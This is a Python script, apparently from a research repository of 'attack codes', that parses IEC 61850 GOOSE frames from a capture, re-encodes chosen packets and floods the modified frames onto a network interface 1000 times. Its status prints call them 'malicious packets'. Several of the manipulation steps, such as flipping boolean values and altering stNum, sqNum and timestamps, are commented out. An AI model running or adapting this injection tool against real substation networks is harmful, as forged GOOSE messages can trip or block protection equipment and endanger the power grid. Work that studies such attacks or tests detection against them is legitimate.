from gooseFunc import *
from scapy.all import *

networkInterface = "eth1"
filter_string = "ether proto 0x88B8 and len <= 200"
GOOSE_TYPE = 0x88b8


# We have to tell script where to find the Goose module in parent directory

currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)


packets = rdpcap('Attack codes\goose_exploit\ids_bust_boolean.pcapng')



datSetList = []
g_packets = []      # To store goose packets

unique_addresses = set()  # To store unique (source, destination) tuples


for packet in packets:
    if goose_check(packet, GOOSE_TYPE):                                  
        # Appending/Storing the packets into a array/list
        g_packets.append(packet)

        # Parse the GOOSE header and GOOSE PDU header
        data = GOOSE(packet.load)

        # Grab the Goose PDU for processing
        goose_pdu = data[GOOSEPDU].original

        # Use PYASN1 to parse the Goose PDU
        goose_decoded = gooseAllData_decode(goose_pdu)
        
       

# SELECTING THE PACKETS TO BE MODIFIED
n = int(input(("How many packets you want to manipulate: ")))
print(f"[+] Select the packets you want to manipulate in the range of 0 to {len(g_packets)}.")
try:
    packet_nos = list(map(int, input("Enter multiple packet numbers separated by space: ").split())) 
except KeyboardInterrupt:
    print('[-] Exiting')




# MODIFYING THE PACKETS
true_value = Data()
false_value = Data()
true_value.setComponentByName('boolean', True)
false_value.setComponentByName('boolean', False)

# NOW CREATING COPIES OF PACKETS BASED ON USER SELECTION
mod_packets = [g_packets[packet_no].copy() for packet_no in packet_nos]

for mod_packet in mod_packets:
    # EXTRACTING THE GOOSE HEADER (8 Bytes: APPID, Length, Reserved 1, Reserved 2)
    mod_packet_load_start_goose = mod_packet.load[:8] 

    # EXTRACTING THE allData PAYLOAD FROM THE END (6 bytes)
    mod_packet_load_end_alldata = mod_packet.load[-6:]
    

    # PARSE THE GOOSE PACKET FOR MODIFICATION
    mod_data = GOOSE(mod_packet.load)
    mod_pdu = mod_data[GOOSEPDU].original
    
    
    print("Mod Data: ")
    print(mod_data)
    mod_data.show()
    print(type(mod_data))
    mod_data.length = len(mod_data) + 10
    print(mod_data)
    mod_data.show()
    mod_pdu_decode = gooseAllData_decode(mod_pdu)
    
    # mod_pdu_decode.setComponentByName('gocbRef', 'PDC02_11_700G_G1CFG/LLN0$GO$GooseDset_BF_PD')
    # mod_pdu_decode.setComponentByName('datSet', 'PDC02_11_700G_G1CFG/LLN0$Dset_BF_PDC02_11_700G_G1CFG/LLN0$Dset_BF')
    
    print("Mod PDU: ")
    print(mod_pdu_decode)
    
    
    
   
    # MODIFYING THE SQNUM AND STNUM PACKETS
    # tmpSQNUM = mod_pdu_decode.getComponentByName('sqNum')
    # tmpSTNUM = mod_pdu_decode.getComponentByName('stNum')

    # # UPDATING THE BOOLEAN VALUES IN THE GOOSEPDU HEADER

    # for value in range(0,mod_pdu_decode['numDatSetEntries']):
    #     if mod_pdu_decode['allData'].getComponentByPosition(value) == False:
    #         mod_pdu_decode['allData'].setComponentByPosition(value, true_value)
    #         continue
    #     elif mod_pdu_decode['allData'].getComponentByPosition(value) == True:
    #         mod_pdu_decode['allData'].setComponentByPosition(value, true_value)
    #         continue

    # # INCREMENT THE STNUM VALUE 
    # mod_pdu_decode.setComponentByName('stNum', (int(tmpSTNUM))+random.randint(0, 10000))

    # # RESETING THE SQNUM VALUE, note that we will need to increment this or increment stNum and keep this 0
    # mod_pdu_decode.setComponentByName('sqNum', int(tmpSQNUM)+ 500) 

    # # WE ALSO HAVE TO CHANGE THE TIMESTAMP WITH THE CURRENT ONE, AND THE TIME SHOULD BE IN 64 BITS
    # new_time = curTime64Bits()
    # mod_pdu_decode.setComponentByName('t',new_time)

    # mod_packet[Ether].len = len(mod_packet) + 10
    # mod_packet[Raw].length = len(mod_packet)  # Assuming 'GOOSE' is a placeholder for your GOOSE layer

    # print(mod_packet)

    # ENCODED THE MODIFIED DATA (ASN.1/BER)
    encoded_data = encoder.encode(mod_pdu_decode)

    # mod_packet.load = mod_packet_load_start_goose + encoded_data
    print(len(encoded_data))


    # REBUILD THE MOD PACKET (GOOSE HEADER + MODIFIED PAYLOAD + REMAINING DATA STRUCTURE)
    mod_packet.load = mod_packet_load_start_goose + encoded_data #+ #mod_packet_load_end_alldata
    
    print(len(mod_packet))

# PRINTING THE ORIGINAL AND MODIFIED PACKET AND FRAMES:
debug = input("Do you want to print the modified data?[Y/N]?: ")
if debug in ['y', 'Y']:
    for user_packet, mod_packet in zip([g_packets[packet_no] for packet_no in packet_nos], mod_packets):
        print("#"*30)
        print("Original Data: ")
        print("#"*30)
        user_pdu_decode = gooseAllData_decode(GOOSE(user_packet.load)[GOOSEPDU].original)
        gooseASN1_DataPrint(user_pdu_decode)

        print("\n\n" + "#"*30)
        print("Original Frame: ")
        print("#"*30)
        user_packet.show()

        # print("#"*30)
        # print("Modified Data: ")
        # print("#"*30)
        # mod_pdu_decode = gooseAllData_decode(GOOSE(mod_packet.load)[GOOSEPDU].original)
        # gooseASN1_DataPrint(mod_pdu_decode)

        print("\n\n" + "#"*30)
        print("Modified Frame:")
        print("#"*30)
        mod_packet.show()

elif debug in ['n', 'N']:
    print("[+] Moving on to the exploit..")

attack_choice = input("Do you want to send the modified packets? (time will be changed)[Y/N]: ")
if attack_choice in ['y', 'Y']:
    try:
        # SENDING THE FRAMES AT HIGH FREQUENCY
        print('[+] Sending malicious packets...')
        flag = 0
        while(flag < 1000):
            for mod_packet in mod_packets:
                sendp(mod_packet, iface=networkInterface)
            flag += 1
    except KeyboardInterrupt:
        print("[-] Stopping the injection...")

elif attack_choice in ['n', 'N']:
    save_choice = input("Do you want to save the modified packets to a file? [Y/N]: ")
    if save_choice in ['y', 'Y']:
        f_name = input("Set filename: ")
        f_name = f_name + ".pcapng"
        try:
            print('[+] Saving the modified packets in pcapng file..')
            for mod_packet in mod_packets:
                wrpcap(f_name, mod_packet, append=True)
            print(f"[+] Successfully saved pcapng file as {f_name} !")
            print("\n\n")

        except KeyboardInterrupt:
            print("[-] Exiting!")
    else:
        print("No action taken on modified packets.")
  
